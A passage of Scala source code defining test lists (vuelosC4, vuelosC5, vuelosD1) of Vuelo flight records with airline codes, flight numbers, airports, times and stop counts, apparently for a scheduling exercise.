    Vuelo(""DL"", 521, ""ORD"", 15, 45, ""DFW"", 18, 0, 0),
    Vuelo(""DL"", 739, ""MIA"", 6, 30, ""MSY"", 15, 5, 1),
    Vuelo(""DL"", 944, ""LAX"", 9, 0, ""SFO"", 10, 18, 0),
    Vuelo(""DL"", 790, ""DFW"", 9, 40, ""ATL"", 12, 42, 0),
    Vuelo(""DL"", 314, ""PHX"", 12, 10, ""ATL"", 12, 9, 0),
    Vuelo(""DL"", 179, ""ATL"", 13, 24, ""LAX"", 16, 40, 1),
    Vuelo(""DL"", 758, ""ATL"", 13, 22, ""DFW"", 16, 14, 2),
    Vuelo(""DL"", 395, ""ATL"", 13, 39, ""MIA"", 15, 25, 0),
    Vuelo(""DL"", 611, ""STL"", 19, 59, ""ATL"", 12, 23, 0),
    Vuelo(""DL"", 663, ""BOS"", 20, 45, ""DCA"", 12, 17, 0),
    Vuelo(""DL"", 636, ""DFW"", 6, 15, ""ATL"", 11, 0, 2),
    Vuelo(""DL"", 166, ""SEA"", 12, 30, ""DCA"", 11, 45, 1),
    Vuelo(""DL"", 790, ""DFW"", 9, 40, ""TPA"", 15, 5, 1),
    Vuelo(""DL"", 422, ""TPA"", 7, 25, ""ATL"", 15, 6, 0),
    Vuelo(""DL"", 412, ""ATL"", 16, 48, ""DTW"", 11, 55, 2),
    Vuelo(""DL"", 277, ""DCA"", 14, 5, ""DFW"", 16, 15, 0),
    Vuelo(""DL"", 772, ""LAX"", 19, 0, ""SFO"", 10, 15, 0),
    Vuelo(""DL"", 765, ""ATL"", 20, 59, ""TPA"", 12, 27, 0),
    Vuelo(""DL"", 446, ""ATL"", 20, 51, ""LAX"", 12, 40, 0),
    Vuelo(""DL"", 307, ""MSY"", 13, 0, ""DFW"", 14, 27, 0),
    Vuelo(""DL"", 304, ""SEA"", 22, 25, ""ATL"", 14, 3, 0),
    Vuelo(""DL"", 500, ""DFW"", 6, 15, ""ATL"", 10, 55, 2),
    Vuelo(""DL"", 556, ""DFW"", 16, 53, ""ATL"", 11, 35, 2),
    Vuelo(""DL"", 170, ""MSY"", 18, 25, ""TPA"", 10, 43, 0),
    Vuelo(""DL"", 219, ""DFW"", 18, 51, ""PHX"", 10, 20, 0),
    Vuelo(""DL"", 539, ""DCA"", 9, 5, ""ATL"", 10, 55, 0),
    Vuelo(""DL"", 154, ""DFW"", 20, 8, ""ATL"", 13, 5, 0),
    Vuelo(""DL"", 719, ""ATL"", 15, 10, ""DFW"", 18, 6, 1),
    Vuelo(""DL"", 603, ""BOS"", 15, 25, ""TPA"", 18, 39, 0),
    Vuelo(""DL"", 987, ""SFO"", 7, 0, ""LAX"", 10, 7, 0),
    Vuelo(""DL"", 182, ""LAX"", 12, 5, ""ATL"", 10, 9, 0),
    Vuelo(""DL"", 170, ""LAX"", 12, 15, ""MSY"", 17, 53, 0),
    Vuelo(""DL"", 878, ""ATL"", 19, 1, ""STL"", 19, 40, 0),
    Vuelo(""DL"", 17, ""ATL"", 10, 6, ""DFW"", 11, 10, 0),
    Vuelo(""DL"", 569, ""SFO"", 17, 0, ""LAX"", 18, 10, 0),
    Vuelo(""DL"", 307, ""ATL"", 11, 44, ""SFO"", 16, 50, 2)
  )

  val vuelosC4= List(
    Vuelo(""DL"", 171, ""LAX"", 21, 59, ""SEA"", 12, 32, 0),
    Vuelo(""DL"", 592, ""DFW"", 17, 57, ""ATL"", 12, 39, 2),
    Vuelo(""DL"", 143, ""ATL"", 22, 35, ""SFO"", 15, 9, 1),
    Vuelo(""DL"", 409, ""ATL"", 8, 20, ""DFW"", 11, 8, 2),
    Vuelo(""DL"", 837, ""ATL"", 12, 3, ""DFW"", 14, 17, 1),
    Vuelo(""DL"", 269, ""ATL"", 12, 0, ""LAX"", 13, 30, 0),
    Vuelo(""DL"", 239, ""ATL"", 8, 33, ""DFW"", 11, 5, 1),
    Vuelo(""DL"", 561, ""ORD"", 5, 30, ""MIA"", 10, 45, 1),
    Vuelo(""DL"", 314, ""PHX"", 12, 10, ""DCA"", 15, 5, 1),
    Vuelo(""DL"", 828, ""STL"", 6, 30, ""ATL"", 15, 8, 0),
    Vuelo(""DL"", 768, ""ABQ"", 9, 45, ""DFW"", 12, 23, 0),
    Vuelo(""DL"", 991, ""DCA"", 19, 55, ""ATL"", 11, 37, 0),
    Vuelo(""DL"", 139, ""ATL"", 15, 14, ""MSY"", 15, 45, 0),
    Vuelo(""DL"", 156, ""SFO"", 22, 20, ""ATL"", 13, 9, 0),
    Vuelo(""DL"", 819, ""DFW"", 15, 0, ""LAX"", 17, 8, 1),
    Vuelo(""DL"", 307, ""DFW"", 15, 14, ""SFO"", 16, 50, 0),
    Vuelo(""DL"", 509, ""MIA"", 16, 10, ""DFW"", 18, 8, 0),
    Vuelo(""DL"", 891, ""BOS"", 9, 40, ""LAX"", 13, 55, 1),
    Vuelo(""DL"", 487, ""BOS"", 18, 50, ""SFO"", 13, 59, 1),
    Vuelo(""DL"", 808, ""SFO"", 6, 0, ""TPA"", 15, 37, 1),
    Vuelo(""DL"", 157, ""ATL"", 15, 29, ""LAX"", 16, 55, 0),
    Vuelo(""DL"", 967, ""STL"", 10, 10, ""ATL"", 12, 35, 0),
    Vuelo(""DL"", 877, ""DFW"", 11, 52, ""HOU"", 12, 55, 0),
    Vuelo(""DL"", 691, ""ATL"", 15, 25, ""SFO"", 10, 55, 3),
    Vuelo(""DL"", 926, ""DFW"", 20, 23, ""RDU"", 13, 55, 0),
    Vuelo(""DL"", 285, ""DFW"", 11, 51, ""LAX"", 13, 0, 0),
    Vuelo(""DL"", 252, ""LAX"", 13, 35, ""PHX"", 15, 53, 0),
    Vuelo(""DL"", 847, ""ATL"", 15, 23, ""DFW"", 17, 55, 1),
    Vuelo(""DL"", 335, ""DFW"", 13, 6, ""ORD"", 19, 50, 3),
    Vuelo(""DL"", 957, ""BOS"", 15, 35, ""SFO"", 10, 45, 1),
    Vuelo(""DL"", 219, ""TPA"", 16, 15, ""PHX"", 10, 20, 1),
    Vuelo(""DL"", 309, ""DEN"", 16, 25, ""LAX"", 19, 10, 1),
    Vuelo(""DL"", 464, ""MIA"", 9, 10, ""DCA"", 13, 25, 1),
    Vuelo(""DL"", 444, ""ATL"", 8, 19, ""PHX"", 13, 10, 3),
    Vuelo(""DL"", 478, ""DFW"", 20, 31, ""BNA"", 12, 15, 0),
    Vuelo(""DL"", 986, ""MIA"", 12, 45, ""ATL"", 14, 33, 0),
    Vuelo(""DL"", 298, ""ATL"", 20, 37, ""ORD"", 11, 40, 0),
    Vuelo(""DL"", 522, ""DFW"", 13, 2, ""DCA"", 16, 59, 0),
    Vuelo(""DL"", 16, ""DFW"", 6, 15, ""ATL"", 11, 8, 0),
    Vuelo(""DL"", 618, ""DFW"", 13, 15, ""ATL"", 17, 54, 1),
    Vuelo(""DL"", 412, ""TPA"", 14, 20, ""RDU"", 18, 0, 1),
    Vuelo(""DL"", 868, ""TPA"", 6, 10, ""ATL"", 13, 0, 0),
    Vuelo(""DL"", 808, ""SFO"", 6, 0, ""LAX"", 10, 4, 0),
    Vuelo(""DL"", 806, ""ATL"", 6, 30, ""RDU"", 14, 0, 0),
    Vuelo(""DL"", 642, ""SFO"", 18, 0, ""LAX"", 19, 11, 0),
    Vuelo(""DL"", 550, ""LAX"", 17, 0, ""SFO"", 18, 12, 0),
    Vuelo(""DL"", 892, ""MIA"", 6, 10, ""TPA"", 10, 0, 0),
    Vuelo(""DL"", 947, ""BNA"", 10, 40, ""ATL"", 12, 37, 0),
    Vuelo(""DL"", 487, ""DFW"", 22, 24, ""SFO"", 13, 59, 0),
    Vuelo(""DL"", 374, ""SFO"", 12, 20, ""DFW"", 12, 3, 0),
    Vuelo(""DL"", 274, ""LAX"", 14, 0, ""SFO"", 15, 15, 0),
    Vuelo(""DL"", 552, ""TPA"", 18, 10, ""ATL"", 19, 29, 0),
    Vuelo(""DL"", 279, ""DFW"", 22, 50, ""LAX"", 13, 58, 0),
    Vuelo(""DL"", 124, ""DFW"", 13, 0, ""ORD"", 15, 14, 0),
    Vuelo(""DL"", 453, ""SFO"", 16, 0, ""LAX"", 17, 11, 0),
    Vuelo(""DL"", 744, ""LAX"", 7, 0, ""SFO"", 11, 7, 0),
    Vuelo(""DL"", 834, ""MIA"", 14, 15, ""ATL"", 16, 10, 0),
    Vuelo(""DL"", 297, ""RDU"", 13, 5, ""ATL"", 14, 27, 0),
    Vuelo(""DL"", 545, ""ATL"", 11, 44, ""DFW"", 14, 30, 1),
    Vuelo(""DL"", 188, ""LAX"", 22, 55, ""ATL"", 14, 7, 0),
    Vuelo(""DL"", 790, ""ATL"", 13, 41, ""TPA"", 15, 5, 0),
    Vuelo(""DL"", 724, ""ATL"", 18, 58, ""RDU"", 10, 15, 0),
    Vuelo(""DL"", 946, ""ATL"", 11, 57, ""DFW"", 14, 17, 1),
    Vuelo(""DL"", 721, ""DFW"", 15, 11, ""ORD"", 17, 20, 0),
    Vuelo(""DL"", 539, ""DCA"", 9, 5, ""TPA"", 13, 20, 1),
    Vuelo(""DL"", 904, ""DFW"", 11, 43, ""ATL"", 15, 55, 1),
    Vuelo(""DL"", 408, ""DFW"", 8, 6, ""HOU"", 11, 0, 0),
    Vuelo(""DL"", 317, ""ATL"", 16, 57, ""TPA"", 18, 20, 0),
    Vuelo(""DL"", 643, ""SFO"", 12, 5, ""ATL"", 19, 36, 0),
    Vuelo(""DL"", 823, ""SFO"", 8, 0, ""LAX"", 11, 5, 0),
    Vuelo(""DL"", 833, ""DFW"", 11, 44, ""ATL"", 16, 6, 1),
    Vuelo(""DL"", 819, ""ORD"", 11, 55, ""DFW"", 14, 5, 0),
    Vuelo(""DL"", 340, ""MIA"", 10, 50, ""ATL"", 12, 41, 0),
    Vuelo(""DL"", 389, ""ATL"", 22, 27, ""TPA"", 13, 45, 0),
    Vuelo(""DL"", 273, ""ATL"", 6, 59, ""TPA"", 11, 5, 0),
    Vuelo(""DL"", 657, ""ATL"", 19, 8, ""DFW"", 11, 37, 1),
    Vuelo(""DL"", 139, ""DCA"", 12, 40, ""DFW"", 17, 53, 2),
    Vuelo(""DL"", 432, ""MSY"", 8, 25, ""ATL"", 10, 42, 0),
    Vuelo(""DL"", 472, ""DFW"", 11, 38, ""ATL"", 14, 35, 0),
    Vuelo(""DL"", 581, ""TPA"", 6, 0, ""ABQ"", 10, 5, 1),
    Vuelo(""DL"", 138, ""LAX"", 17, 55, ""DFW"", 12, 40, 0),
    Vuelo(""DL"", 295, ""ATL"", 11, 46, ""PHX"", 13, 35, 0),
    Vuelo(""DL"", 545, ""ATL"", 11, 44, ""ABQ"", 16, 5, 2),
    Vuelo(""DL"", 735, ""ATL"", 23, 47, ""BNA"", 13, 40, 0),
    Vuelo(""DL"", 336, ""SFO"", 12, 15, ""PHL"", 12, 5, 1),
    Vuelo(""DL"", 605, ""DEN"", 13, 20, ""DFW"", 16, 15, 0),
    Vuelo(""DL"", 657, ""BNA"", 19, 45, ""DFW"", 11, 37, 0),
    Vuelo(""DL"", 793, ""ATL"", 8, 19, ""DFW"", 10, 55, 1),
    Vuelo(""DL"", 227, ""ATL"", 20, 35, ""DFW"", 11, 48, 0),
    Vuelo(""DL"", 402, ""DEN"", 7, 45, ""DCA"", 14, 59, 1),
    Vuelo(""DL"", 402, ""ATL"", 13, 20, ""DCA"", 14, 59, 0),
    Vuelo(""DL"", 448, ""MSY"", 6, 45, ""ATL"", 11, 2, 0),
    Vuelo(""DL"", 139, ""DCA"", 12, 40, ""LAX"", 11, 20, 4),
    Vuelo(""DL"", 585, ""ATL"", 22, 15, ""DFW"", 13, 17, 0),
    Vuelo(""DL"", 501, ""DTW"", 12, 40, ""ATL"", 14, 35, 0),
    Vuelo(""DL"", 660, ""ABQ"", 13, 25, ""DFW"", 16, 3, 0),
    Vuelo(""DL"", 139, ""DCA"", 12, 40, ""MSY"", 15, 45, 1),
    Vuelo(""DL"", 940, ""DFW"", 15, 14, ""ATL"", 19, 38, 1),
    Vuelo(""DL"", 263, ""BOS"", 18, 45, ""ATL"", 11, 27, 0),
    Vuelo(""DL"", 476, ""LAX"", 14, 15, ""DFW"", 19, 18, 0)
  )

  val vuelosC5= List(
    Vuelo(""DL"", 197, ""TPA"", 16, 10, ""ATL"", 17, 37, 0),
    Vuelo(""DL"", 208, ""TPA"", 11, 40, ""BOS"", 14, 24, 0),
    Vuelo(""DL"", 233, ""DFW"", 11, 40, ""DEN"", 12, 37, 0),
    Vuelo(""DL"", 817, ""ATL"", 18, 42, ""DFW"", 11, 40, 2),
    Vuelo(""DL"", 598, ""ATL"", 11, 47, ""ORD"", 12, 35, 0),
    Vuelo(""DL"", 347, ""BOS"", 6, 0, ""SFO"", 11, 10, 1),
    Vuelo(""DL"", 141, ""LAX"", 21, 0, ""SFO"", 12, 17, 0),
    Vuelo(""DL"", 178, ""LAX"", 10, 40, ""ATL"", 17, 48, 0),
    Vuelo(""DL"", 977, ""ATL"", 12, 9, ""SFO"", 14, 15, 0),
    Vuelo(""DL"", 575, ""ORD"", 13, 20, ""ATL"", 16, 7, 0),
    Vuelo(""DL"", 125, ""ATL"", 11, 47, ""DFW"", 14, 25, 1),
    Vuelo(""DL"", 970, ""ATL"", 19, 43, ""DFW"", 11, 39, 1),
    Vuelo(""DL"", 444, ""DFW"", 11, 53, ""PHX"", 13, 10, 0),
    Vuelo(""DL"", 748, ""LAX"", 10, 40, ""DFW"", 15, 28, 0),
    Vuelo(""DL"", 320, ""MSP"", 10, 55, ""ATL"", 14, 11, 0),
    Vuelo(""DL"", 940, ""DTW"", 12, 20, ""DFW"", 14, 3, 0),
    Vuelo(""DL"", 511, ""BNA"", 15, 50, ""ATL"", 17, 44, 0),
    Vuelo(""DL"", 299, ""ATL"", 11, 59, ""DFW"", 14, 15, 1),
    Vuelo(""DL"", 358, ""DFW"", 13, 7, ""BOS"", 17, 55, 0),
    Vuelo(""DL"", 726, ""ATL"", 10, 18, ""PHL"", 12, 15, 0),
    Vuelo(""DL"", 169, ""BOS"", 11, 5, ""DFW"", 13, 59, 0),
    Vuelo(""DL"", 803, ""ATL"", 8, 25, ""DFW"", 10, 55, 1),
    Vuelo(""DL"", 566, ""HOU"", 11, 40, ""ATL"", 14, 33, 0),
    Vuelo(""DL"", 964, ""ATL"", 10, 4, ""DTW"", 11, 50, 0),
    Vuelo(""DL"", 584, ""DFW"", 13, 16, ""TPA"", 16, 40, 0),
    Vuelo(""DL"", 401, ""ORD"", 6, 0, ""ATL"", 11, 8, 2),
    Vuelo(""DL"", 660, ""DFW"", 17, 0, ""DCA"", 10, 45, 0),
    Vuelo(""DL"", 262, ""DFW"", 13, 16, ""DTW"", 16, 55, 0),
    Vuelo(""DL"", 625, ""ATL"", 22, 31, ""SEA"", 13, 0, 1),
    Vuelo(""DL"", 30, ""ATL"", 12, 30, ""JFK"", 14, 38, 0),
    Vuelo(""DL"", 139, ""DCA"", 12, 40, ""ATL"", 14, 28, 0),
    Vuelo(""DL"", 755, ""BOS"", 11, 45, ""ATL"", 14, 26, 0),
    Vuelo(""DL"", 469, ""ATL"", 22, 22, ""MIA"", 13, 56, 0),
    Vuelo(""DL"", 583, ""MSP"", 9, 0, ""TPA"", 14, 35, 1),
    Vuelo(""DL"", 174, ""DFW"", 13, 7, ""MIA"", 16, 45, 0),
    Vuelo(""DL"", 684, ""LAX"", 15, 0, ""SFO"", 16, 11, 0),
    Vuelo(""DL"", 276, ""TPA"", 10, 0, ""PHL"", 13, 40, 1),
    Vuelo(""DL"", 582, ""TPA"", 21, 30, ""ATL"", 12, 47, 0),
    Vuelo(""DL"", 523, ""DCA"", 10, 45, ""SEA"", 14, 30, 1),
    Vuelo(""DL"", 919, ""PHL"", 5, 35, ""ATL"", 13, 0, 0),
    Vuelo(""DL"", 307, ""ATL"", 11, 44, ""MSY"", 12, 16, 0),
    Vuelo(""DL"", 163, ""SFO"", 13, 0, ""LAX"", 14, 15, 0),
    Vuelo(""DL"", 408, ""DFW"", 8, 6, ""ATL"", 12, 35, 1),
    Vuelo(""DL"", 991, ""DCA"", 19, 55, ""MSY"", 12, 50, 1),
    Vuelo(""DL"", 139, ""MSY"", 16, 25, ""DFW"", 17, 53, 0),
    Vuelo(""DL"", 694, ""DFW"", 23, 49, ""MSY"", 10, 5, 0),
    Vuelo(""DL"", 688, ""DFW"", 15, 0, ""ATL"", 18, 0, 0),
    Vuelo(""DL"", 703, ""DFW"", 11, 43, ""SEA"", 13, 40, 0),
    Vuelo(""DL"", 821, ""DTW"", 8, 45, ""ATL"", 10, 29, 0),
    Vuelo(""DL"", 991, ""ATL"", 22, 32, ""MSY"", 12, 50, 0),
    Vuelo(""DL"", 256, ""ATL"", 20, 59, ""DTW"", 12, 50, 0),
    Vuelo(""DL"", 472, ""DFW"", 11, 38, ""MIA"", 17, 15, 1),
    Vuelo(""DL"", 145, ""ATL"", 15, 10, ""DFW"", 16, 22, 0),
    Vuelo(""DL"", 581, ""DFW"", 8, 12, ""ABQ"", 10, 5, 0),
    Vuelo(""DL"", 387, ""SFO"", 15, 0, ""LAX"", 16, 11, 0),
    Vuelo(""DL"", 260, ""DFW"", 17, 58, ""ATL"", 12, 54, 2),
    Vuelo(""DL"", 390, ""HOU"", 6, 15, ""DFW"", 12, 4, 0),
    Vuelo(""DL"", 856, ""LAX"", 8, 0, ""SFO"", 11, 7, 0),
    Vuelo(""DL"", 645, ""DTW"", 16, 0, ""DFW"", 17, 50, 0),
    Vuelo(""DL"", 408, ""HOU"", 9, 40, ""ATL"", 12, 35, 0),
    Vuelo(""DL"", 996, ""LAX"", 12, 30, ""BOS"", 11, 46, 2),
    Vuelo(""DL"", 508, ""DFW"", 10, 41, ""ATL"", 14, 27, 1),
    Vuelo(""DL"", 474, ""ATL"", 23, 55, ""TPA"", 11, 0, 0),
    Vuelo(""DL"", 578, ""TPA"", 11, 15, ""ATL"", 12, 44, 0),
    Vuelo(""DL"", 539, ""ATL"", 11, 54, ""TPA"", 13, 20, 0),
    Vuelo(""DL"", 845, ""ATL"", 15, 27, ""DFW"", 17, 52, 1),
    Vuelo(""DL"", 436, ""TPA"", 9, 35, ""ATL"", 11, 2, 0),
    Vuelo(""DL"", 321, ""ATL"", 8, 19, ""MIA"", 10, 0, 0),
    Vuelo(""DL"", 356, ""ATL"", 15, 30, ""BOS"", 17, 52, 0),
    Vuelo(""DL"", 449, ""ATL"", 11, 44, ""MIA"", 13, 25, 0),
    Vuelo(""DL"", 558, ""SEA"", 12, 35, ""MIA"", 12, 15, 2),
    Vuelo(""DL"", 558, ""SEA"", 12, 35, ""DFW"", 19, 43, 1),
    Vuelo(""DL"", 588, ""PHX"", 12, 55, ""DTW"", 10, 30, 1),
    Vuelo(""DL"", 873, ""ATL"", 9, 7, ""DFW"", 11, 8, 1),
    Vuelo(""DL"", 333, ""DFW"", 22, 28, ""ABQ"", 13, 10, 0),
    Vuelo(""DL"", 470, ""ATL"", 18, 45, ""PVD"", 11, 0, 0),
    Vuelo(""DL"", 222, ""PHX"", 10, 30, ""ATL"", 16, 10, 0),
    Vuelo(""DL"", 464, ""ATL"", 11, 45, ""DCA"", 13, 25, 0),
    Vuelo(""DL"", 528, ""DCA"", 6, 50, ""BOS"", 10, 9, 0),
    Vuelo(""DL"", 1042, ""ABQ"", 6, 30, ""DFW"", 10, 1, 0),
    Vuelo(""DL"", 651, ""MSY"", 6, 0, ""DFW"", 13, 1, 0),
    Vuelo(""DL"", 820, ""ATL"", 10, 14, ""ORD"", 11, 5, 0),
    Vuelo(""DL"", 170, ""LAX"", 12, 15, ""TPA"", 10, 43, 1),
    Vuelo(""DL"", 946, ""ATL"", 11, 57, ""HOU"", 16, 3, 2),
    Vuelo(""DL"", 819, ""ORD"", 11, 55, ""LAX"", 17, 8, 2),
    Vuelo(""FF"", 37, ""JFK"", 20, 45, ""MIA"", 13, 40, 0),
    Vuelo(""HP"", 2, ""PHX"", 8, 0, ""ORD"", 12, 20, 0),
    Vuelo(""HP"", 44, ""ATL"", 8, 15, ""LAX"", 11, 25, 1),
    Vuelo(""HP"", 7, ""JFK"", 17, 20, ""PHX"", 10, 57, 0),
    Vuelo(""HP"", 38, ""DEN"", 18, 3, ""LAX"", 10, 30, 1),
    Vuelo(""HP"", 268, ""PHX"", 14, 33, ""DCA"", 11, 51, 1),
    Vuelo(""HP"", 862, ""DFW"", 17, 14, ""PHX"", 18, 46, 0),
    Vuelo(""HP"", 547, ""PHX"", 15, 37, ""DFW"", 19, 1, 0),
    Vuelo(""HP"", 594, ""SFO"", 11, 53, ""PHX"", 14, 44, 0),
    Vuelo(""HP"", 207, ""PHX"", 13, 7, ""ABQ"", 14, 15, 0),
    Vuelo(""HP"", 97, ""DEN"", 16, 50, ""PHX"", 18, 49, 0),
    Vuelo(""HP"", 836, ""ABQ"", 12, 30, ""PHX"", 13, 45, 0),
    Vuelo(""HP"", 636, ""DFW"", 19, 34, ""PHX"", 11, 3, 0),
    Vuelo(""HP"", 518, ""SEA"", 16, 0, ""PHX"", 19, 50, 0),
    Vuelo(""HP"", 864, ""DCA"", 16, 40, ""PHX"", 10, 59, 1)
  )

  //__________________________________________________

  //longitud 500

 val vuelosD1= List(
    Vuelo(""HP"", 548, ""PHX"", 18, 17, ""DFW"", 11, 45, 0),
    Vuelo(""HP"", 24, ""PHX"", 14, 30, ""LAX"", 14, 50, 0),
    Vuelo(""HP"", 14, ""PHX"", 6, 50, ""LAX"", 10, 6, 0),
    Vuelo(""HP"", 493, ""PHX"", 20, 34, ""DEN"", 12, 20, 0),
    Vuelo(""HP"", 252, ""LAX"", 7, 35, ""PHX"", 15, 0, 0),
    Vuelo(""HP"", 200, ""PHX"", 8, 10, ""ABQ"", 12, 0, 0),
    Vuelo(""HP"", 606, ""MSP"", 8, 45, ""SFO"", 13, 7, 1),
    Vuelo(""HP"", 622, ""DFW"", 7, 5, ""PHX"", 13, 6, 0),
    Vuelo(""HP"", 76, ""BOS"", 17, 0, ""PHX"", 10, 58, 0),
    Vuelo(""HP"", 647, ""ABQ"", 17, 30, ""PHX"", 18, 45, 0),
    Vuelo(""HP"", 301, ""PHX"", 23, 20, ""SFO"", 14, 0, 1),
    Vuelo(""HP"", 841, ""PHX"", 12, 10, ""SEA"", 15, 16, 1),
    Vuelo(""HP"", 202, ""PHX"", 10, 34, ""ABQ"", 11, 44, 0),
    Vuelo(""HP"", 458, ""LAX"", 20, 20, ""PHX"", 12, 35, 0),
    Vuelo(""HP"", 480, ""STL"", 13, 48, ""PHX"", 16, 10, 0),
    Vuelo(""HP"", 832, ""STL"", 18, 10, ""PHX"", 10, 37, 0),
    Vuelo(""HP"", 497, ""PHX"", 8, 55, ""DEN"", 10, 41, 0),
    Vuelo(""HP"", 834, ""DFW"", 14, 40, ""PHX"", 16, 12, 0),
    Vuelo(""HP"", 18, ""PHX"", 10, 25, ""LAX"", 10, 45, 0),
    Vuelo(""HP"", 496, ""PHX"", 15, 49, ""DEN"", 17, 33, 0),
    Vuelo(""HP"", 790, ""PHX"", 20, 45, ""JFK"", 12, 5, 0),
    Vuelo(""HP"", 606, ""MSP"", 8, 45, ""PHX"", 11, 7, 0),
    Vuelo(""HP"", 820, ""PHX"", 13, 3, ""BOS"", 19, 48, 0),
    Vuelo(""HP"", 653, ""ABQ"", 10, 0, ""PHX"", 11, 15, 0),
    Vuelo(""HP"", 845, ""ABQ"", 14, 55, ""PHX"", 16, 10, 0),
    Vuelo(""HP"", 838, ""ATL"", 9, 0, ""PHX"", 11, 10, 0),
    Vuelo(""HP"", 15, ""PHX"", 8, 0, ""LAX"", 12, 0, 0),
    Vuelo(""HP"", 586, ""PHX"", 18, 13, ""MSP"", 12, 17, 0),
    Vuelo(""HP"", 292, ""PHX"", 13, 20, ""JFK"", 10, 0, 0),
    Vuelo(""HP"", 843, ""DFW"", 16, 15, ""SEA"", 10, 52, 1),
    Vuelo(""HP"", 892, ""LAX"", 15, 20, ""PHX"", 17, 35, 0),
    Vuelo(""HP"", 333, ""PHX"", 20, 50, ""ORD"", 11, 8, 0),
    Vuelo(""HP"", 8, ""PHX"", 18, 5, ""ORD"", 12, 22, 0),
    Vuelo(""HP"", 600, ""PHX"", 7, 40, ""SFO"", 13, 9, 0),
    Vuelo(""HP"", 845, ""PHX"", 16, 57, ""SEA"", 19, 18, 0),
    Vuelo(""HP"", 605, ""PHX"", 17, 0, ""SFO"", 18, 2, 0),
    Vuelo(""HP"", 705, ""JFK"", 5, 5, ""PHX"", 14, 2, 0),
    Vuelo(""HP"", 602, ""PHX"", 19, 45, ""SFO"", 10, 49, 0),
    Vuelo(""HP"", 897, ""SFO"", 6, 55, ""PHX"", 15, 0, 0),
    Vuelo(""HP"", 82, ""BOS"", 7, 35, ""PHX"", 11, 29, 0),
    Vuelo(""HP"", 844, ""DEN"", 6, 45, ""PHX"", 14, 2, 0),
    Vuelo(""HP"", 20, ""PHX"", 12, 0, ""LAX"", 12, 20, 0),
    Vuelo(""HP"", 491, ""PHX"", 18, 11, ""DEN"", 19, 58, 0),
    Vuelo(""HP"", 17, ""PHX"", 9, 25, ""LAX"", 14, 5, 0),
    Vuelo(""HP"", 844, ""DEN"", 6, 45, ""SEA"", 11, 57, 1),
    Vuelo(""HP"", 35, ""PHX"", 21, 55, ""LAX"", 12, 15, 0),
    Vuelo(""HP"", 840, ""DEN"", 18, 55, ""SEA"", 13, 58, 1),
    Vuelo(""HP"", 607, ""STL"", 16, 2, ""SFO"", 19, 43, 1),
    Vuelo(""HP"", 499, ""PHX"", 12, 0, ""DEN"", 15, 38, 1),
    Vuelo(""HP"", 854, ""DEN"", 11, 40, ""PHX"", 13, 41, 0),
    Vuelo(""HP"", 223, ""LAX"", 12, 50, ""PHX"", 15, 5, 0),
    Vuelo(""HP"", 540, ""PHX"", 13, 13, ""DFW"", 16, 39, 0),
    Vuelo(""HP"", 490, ""PHX"", 10, 40, ""DEN"", 12, 29, 0),
    Vuelo(""HP"", 220, ""LAX"", 17, 45, ""PHX"", 10, 0, 0),
    Vuelo(""HP"", 711, ""JFK"", 20, 55, ""PHX"", 13, 0, 1),
    Vuelo(""HP"", 604, ""PHX"", 9, 47, ""SFO"", 10, 50, 0),
    Vuelo(""HP"", 29, ""PHX"", 16, 55, ""LAX"", 17, 15, 0),
    Vuelo(""HP"", 4, ""PHX"", 10, 30, ""ORD"", 14, 44, 0),
    Vuelo(""HP"", 1, ""ORD"", 6, 5, ""PHX"", 15, 3, 0),
    Vuelo(""HP"", 215, ""SFO"", 8, 10, ""ABQ"", 12, 43, 1),
    Vuelo(""HP"", 9, ""JFK"", 9, 50, ""PHX"", 13, 28, 0),
    Vuelo(""HP"", 425, ""LAX"", 10, 15, ""PHX"", 12, 30, 0),
    Vuelo(""HP"", 347, ""LAX"", 21, 0, ""SEA"", 15, 0, 1),
    Vuelo(""HP"", 606, ""PHX"", 12, 5, ""SFO"", 13, 7, 0),
    Vuelo(""HP"", 840, ""DEN"", 18, 55, ""PHX"", 10, 54, 0),
    Vuelo(""HP"", 264, ""PHX"", 8, 40, ""DCA"", 15, 58, 1),
    Vuelo(""HP"", 290, ""PHX"", 9, 0, ""JFK"", 15, 40, 0),
    Vuelo(""HP"", 492, ""PHX"", 13, 4, ""DEN"", 14, 48, 0),
    Vuelo(""HP"", 31, ""PHX"", 19, 30, ""LAX"", 19, 50, 0),
    Vuelo(""HP"", 847, ""DFW"", 8, 45, ""SEA"", 13, 11, 1),
    Vuelo(""HP"", 91, ""DCA"", 8, 0, ""PHX"", 12, 15, 1),
    Vuelo(""HP"", 111, ""ORD"", 3, 15, ""PHX"", 11, 0, 0),
    Vuelo(""HP"", 603, ""DEN"", 13, 5, ""SFO"", 16, 40, 1),
    Vuelo(""HP"", 523, ""PHX"", 7, 15, ""SEA"", 11, 30, 2),
    Vuelo(""HP"", 10, ""ORD"", 15, 40, ""PHX"", 18, 30, 0),
    Vuelo(""HP"", 212, ""PHX"", 20, 47, ""ABQ"", 11, 58, 0),
    Vuelo(""HP"", 840, ""PHX"", 21, 40, ""SEA"", 13, 58, 0),
    Vuelo(""HP"", 182, ""PHX"", 22, 10, ""BOS"", 14, 8, 1),
    Vuelo(""HP"", 580, ""PHX"", 10, 35, ""MSP"", 14, 45, 0),
    Vuelo(""HP"", 650, ""ABQ"", 7, 0, ""PHX"", 11, 4, 0),
    Vuelo(""HP"", 6, ""ORD"", 13, 10, ""PHX"", 16, 3, 0),
    Vuelo(""HP"", 844, ""PHX"", 9, 32, ""SEA"", 11, 57, 0),
    Vuelo(""HP"", 546, ""PHX"", 10, 33, ""DFW"", 14, 0, 0),
    Vuelo(""HP"", 208, ""PHX"", 18, 6, ""ABQ"", 19, 13, 0),
    Vuelo(""HP"", 205, ""PHX"", 15, 45, ""ABQ"", 16, 54, 0),
    Vuelo(""HP"", 851, ""STL"", 6, 30, ""PHX"", 14, 5, 0),
    Vuelo(""HP"", 826, ""PHX"", 9, 10, ""BOS"", 15, 57, 0),
    Vuelo(""MG"", 500, ""JFK"", 18, 40, ""LAX"", 11, 40, 0),
    Vuelo(""MG"", 200, ""LAX"", 8, 45, ""JFK"", 17, 0, 0),
    Vuelo(""MG"", 600, ""LAX"", 15, 30, ""JFK"", 13, 45, 0),
    Vuelo(""MG"", 300, ""JFK"", 10, 30, ""LAX"", 13, 20, 0),
    Vuelo(""NW"", 379, ""PHL"", 17, 5, ""MSP"", 18, 55, 0),
    Vuelo(""NW"", 248, ""PHX"", 10, 0, ""DTW"", 15, 37, 0),
    Vuelo(""NW"", 209, ""PHL"", 17, 45, ""DTW"", 19, 33, 0),
    Vuelo(""NW"", 695, ""DTW"", 18, 55, ""DFW"", 11, 3, 0),
